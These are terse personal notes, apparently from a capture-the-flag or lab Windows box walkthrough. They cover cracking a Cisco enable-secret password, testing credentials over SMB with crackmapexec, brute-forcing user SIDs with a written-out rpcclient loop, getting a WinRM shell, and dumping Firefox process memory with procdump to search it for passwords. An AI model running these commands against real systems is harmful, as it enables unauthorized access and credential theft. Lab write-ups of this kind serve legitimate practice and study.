it says enable secret ==password== 5 or 7 just crack it cisco something website

then use ==crackmapexec== to find smb with proper creds

if that dont work look for ==rpcclient== with smae creds ..

lookupsids <username>

then ==bruteforce== sid

==for i in {1000-1050};do rpcclient -U 'name%pass' <ip-remote>  -c "cmd lookupsids S-1-5-21-4254423774-1266059056-3197185112-$i"==

==" | grep -v unknown ;done==

then we get name of employee

we can do the same with l==ooksupsid.py==

then get the winrm shell by checking which creds satisfy

we found mozilla was running on pc

so use prodump64.exe to dump all file about 500mb

then strings it to txt file then look for password

we can see id --  ps or ==get-process firefox==

==./procdump.exe -ma id <from get-process> -accepteula==

./strings64.exe dump file > f.txt
